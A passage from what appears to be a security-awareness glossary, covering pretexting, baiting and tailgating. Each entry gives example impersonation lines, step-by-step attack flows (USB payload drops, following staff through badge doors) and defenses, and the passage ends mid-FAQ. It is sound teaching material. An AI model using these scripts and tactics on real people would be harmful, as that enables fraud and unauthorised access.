Pretexting constructs a believable scenario (the pretext) that justifies the attacker's request. Often the foundation of vishing, in-person social engineering and BEC.
② Explanation

Strong pretexts borrow real authority: "Hi, this is Mike from IT — we're rolling out the security update we sent yesterday, can you confirm your username?". Reference real internal terms, real names, real schedules to feel legitimate.

Persuasion levers: authority (boss, IT, regulator), urgency ("before the audit at 3"), scarcity, liking (chit-chat first), reciprocity, social proof ("everyone else already did it").

Famous case: Kevin Mitnick built half his career on pretexting. Modern descendant: vendor impersonation calls to helpdesks — "reset MFA for John Doe, he's locked out before a board meeting."

③ Where It Appears
Vishing campaigns
Physical access pretexts
Helpdesk MFA-reset attacks
Vendor-impersonation fraud
④ How It Works
1Pick target action (info, access, money)
2Research org structure + processes
3Craft believable scenario
4Practice delivery + objection handling
5Execute on right victim at right time
⑤ Attack & Defense
Attack technique
  • "IT here" calling about Wi-Fi
  • Helpdesk MFA reset request
  • Vendor impersonation for invoice
  • "Auditor" requesting access list
Defense awareness
  • Callback verification on sensitive requests
  • Helpdesk procedures requiring out-of-band
  • Train staff: it's OK to verify
  • Identity-proofing for resets
⚠ Common Mistakes
❌ Beliefa convincing story means it is legit
✓ Realitya good pretext is the attack itself
Why: the believable backstory is precisely the tool used to lower your guard.
❌ Beliefit only happens by email
✓ Realityphone and in-person pretexts work too
Why: a confident "IT technician" on the phone or at the desk is a classic pretext.
⑥ Remember This
Pretexting works because helping is the default. Make verification the default instead.
FAQ
What is pretexting?
Inventing a believable scenario to manipulate someone into helping.
What are examples?
Posing as IT support, a vendor, or a new employee.
Why is it effective?
It leverages authority and the urge to be helpful.
What is the defense?
Verify identity through a known, official channel.
My Notes
Auto-saved
Learned it? Next:E·06 VishingE·10 Impersonation
cherry root › block 9 › E·04
Baiting
Physical or digital lure — USB drops, fake downloads, free stuff.
E·04socialengphysicalusb
tags: Studied Review Hard Favorite
Before this term:E·01 Phishing
① Simple Definition
"Curiosity didn't kill the cat. The USB stick did."
Baiting leaves attractive bait — labeled USB drives, fake software downloads, free media — hoping a target will pick it up and run it.
② Explanation

Classic: drop USB sticks labeled "Salaries 2026" in the company parking lot. Studies show 30-60% pickup + plug-in rates. Modern variant: USB Rubber Ducky / BadUSB — looks like a stick, types pre-programmed keystrokes when plugged in.

Digital baiting: cracked software with malware, fake browser extensions, malicious npm packages with names like real ones (typosquatting), free "premium" downloads on torrents.

MITRE: T1091 Replication Through Removable Media, T1195 Supply Chain Compromise for software baiting.

③ Where It Appears
Red team physical assessments
Mass attacks via torrents
npm/PyPI supply chain
Conference badge giveaways
④ How It Works
1Pick bait that fits target context
2Embed payload (HID, executable)
3Place where target will find
4Wait for plug-in / execution
5Get callback in C2
⑤ Attack & Defense
Attack technique
  • Rubber Ducky in branded stick
  • "Free movie" with stealer
  • Typosquat npm package
  • Conference giveaway with payload
Defense awareness
  • Disable USB autorun + HID on policy
  • Endpoint controls on removable media
  • Code-signing requirements
  • User training + report channels
⚠ Common Mistakes
❌ Beliefa found USB is safe to plug in
✓ Realitydropped USBs are a classic bait
Why: attackers leave malicious drives where curious people will find and plug them in.
❌ Belieffree downloads are harmless
✓ Realitybait lures with something desirable
Why: free media, cracks, and "prizes" are wrappers for malware.
⑥ Remember This
If you didn't request it and it's free, the cost is your machine.
FAQ
What is baiting?
Tempting a victim with something attractive that delivers an attack.
What are examples?
Dropped USB drives and "free" downloads.
Why does it work?
It exploits curiosity and the appeal of something for nothing.
What is the defense?
Never plug in unknown devices; enforce device policy.
My Notes
Auto-saved
Learned it? Next:E·05 TailgatingE·01 Phishing
cherry root › block 9 › E·05
Tailgating
Physical entry by following an authorized person through a door.
E·05socialengphysicalaccess
tags: Studied Review Hard Favorite
Before this term:B·01 Hardware
① Simple Definition
"Hold the door for the nice person with the coffee. They were never on the badge list."
Tailgating (also piggybacking) is physically following an authorized employee through a controlled entry (badge door, mantrap, gate) without using your own credential.
② Explanation

Tricks that work: hands full (coffee + laptop), pretending to fumble for a badge, dressed as delivery / vendor / cleaning, friendly chat in a smoking area before the entry, timing for shift changes.

Variant: shoulder surfing (watching badge or PIN entry), elevator hijacking (waiting in elevator for floor swipe), vendor impersonation with fake work order.

Combats: mantraps (only one person at a time), turnstiles, badge-in/badge-out logging, security awareness — "if you don't recognize them, don't hold the door".

③ Where It Appears
Physical red team
Office buildings
Data center perimeters
Healthcare / government facilities
④ How It Works
1Recon entry points + shift times
2Pick blend-in look
3Approach with hands full
4Follow employee through
5Walk in like you belong
⑤ Attack & Defense
Attack technique
  • Hands-full coffee tactic
  • Delivery uniform + fake package
  • Smoke-break re-entry
  • Vendor with fake work order
Defense awareness
  • Mantraps + turnstiles
  • Visible badging policy
  • "Challenge unknowns" culture
  • Visitor escort requirements
⚠ Common Mistakes
❌ Beliefphysical security is not real hacking
✓ Realityphysical access is extremely powerful
Why: once inside, an attacker can plant devices, grab drives, or reach internal networks.
❌ Beliefholding the door is just being polite
✓ Realityit can let an attacker walk right in
Why: tailgating relies on people's reluctance to challenge a confident stranger.
⑥ Remember This
Physical access often beats years of digital defense. The door is part of the perimeter.
FAQ
What is tailgating?
Following an authorized person through a secure door without your own access.
Why is it effective?
